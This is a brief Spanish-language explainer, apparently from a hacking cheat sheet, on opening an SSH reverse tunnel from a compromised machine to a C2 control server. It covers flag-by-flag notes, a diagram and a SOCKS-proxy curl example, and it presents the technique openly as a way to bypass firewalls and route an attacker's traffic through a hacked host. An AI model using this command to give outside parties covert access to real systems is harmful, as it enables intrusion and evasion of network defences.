## COMANDO PARA CREAR UN TUNEL DESDE UNA MAQUINA INTERVENIDA, PARA DAR ACCESO A OTRA DESDE FUERA, PANEL DE CONTROL C2

ssh –fN -R 127.0.0.1:<puerto SOCKS> <usuario>@<dirección IP C2>

-f: Hace que SSH se ejecute en segundo plano (fork) después de autenticarse.

-N: Indica que no se ejecutará ningún comando remoto (solo se establece el túnel).

-R: Configura un túnel inverso (Reverse Tunnel), donde un puerto en el servidor remoto (C2) es redirigido a tu máquina local.

Estructura del túnel inverso (-R):
127.0.0.1:<puerto_SOCKS>:

127.0.0.1 significa que el túnel estará accesible solo localmente en el servidor C2 (no expuesto externamente a menos que se configure así).

<puerto_SOCKS> es el puerto en el servidor C2 que redirigirá el tráfico hacia tu máquina local.

<usuario>@<dirección_IP_C2>:

Credenciales para conectarse al servidor panel de control C2 (usuario y dirección IP/hostname).

Establece un túnel inverso:

El servidor C2 escuchará en 127.0.0.1:<puerto_SOCKS> y redirigirá todo el tráfico a través del túnel SSH hacia tu máquina local.

Por ejemplo, si alguien en el C2 accede a 127.0.0.1:1080, el tráfico llegará a tu máquina.

Usos comunes:

Acceso a servicios internos: Si tu máquina local tiene un servicio (ej: un servidor web en el puerto 80), alguien en el C2 podría acceder a él conectándose a 127.0.0.1:<puerto_SOCKS>.

Evitar firewalls: Útil para bypassear restricciones de salida (el túnel se inicia desde dentro de la red local hacia el C2).

Proxy SOCKS: Si configuras un proxy SOCKS en tu máquina local, el C2 podría usarlo para enrutar tráfico a través de tu conexión.


ssh -fN -R 127.0.0.1:1080 user@c2-server.com


El C2 (c2-server.com) escuchará en 127.0.0.1:1080 y redirigirá el tráfico a tu máquina local.

┌─────────────────────────┐          ┌───────────────────────┐
│                         │          │   Nuestro PC          │
│   Máquina Local         │          │   Panel control C2    │
│  (sistema hackeado)     │          │   (Atacante/Admin)    │
│                         │          │                       │
│  +------------------+   │          │   +----------------+  │
│  | Servicio Local   |   │          │   | Escucha en:     | │
│  | (Ej: SOCKS Proxy,|   │  SSH     │   | 127.0.0.1:1080  | │
│  |  Web en :8080)   |◄──┼──────────┼───┤ (Puerto remoto) | │
│  +------------------+   │  -R 1080 │   +----------------+  │
│                         │          │                       │
└────────────|────────────┘          └───────────────────────┘
             |
             |
          Exploit

Si en tu local tienes un proxy SOCKS en el puerto 1080, el C2 podría usarlo, para navegar por ej,

curl  --socks5 127.0.0.1:1080 http://hackingyseguridad.com


